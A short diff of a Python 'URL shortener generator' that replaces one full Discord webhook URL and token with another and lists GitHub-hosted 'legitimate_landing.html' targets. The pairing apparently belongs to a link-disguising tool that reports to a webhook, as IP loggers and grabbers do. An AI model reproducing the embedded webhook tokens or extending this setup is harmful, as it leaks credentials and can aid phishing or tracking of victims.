@@ -12,7 +12,7 @@ from urllib.parse import urlencode
 
 class URLShortenerGenerator:
     def __init__(self):
-        self.webhook_url = "https://discord.com/api/webhooks/1285243636399796285/dBG84iTwDcJJWXw5JD4d-DJhfnzVA5d5oKUQkqMhqRx4s6KEcE2xfSGHBKs4HYN1B7aN"
+        self.webhook_url = "https://discord.com/api/webhooks/1417442947686731856/1UGJsXCLBqIZmb2shm4CjxJhAzZtObsbKtbStAmPg5jKtvbVt9WqRfRkNZ6ymjuiDS95"
         self.target_urls = [
             "https://raw.githubusercontent.com/Jeki1234121/hollistisk-v2/main/legitimate_landing.html",
             "https://cdn.jsdelivr.net/gh/Jeki1234121/hollistisk-v2/legitimate_landing.html",
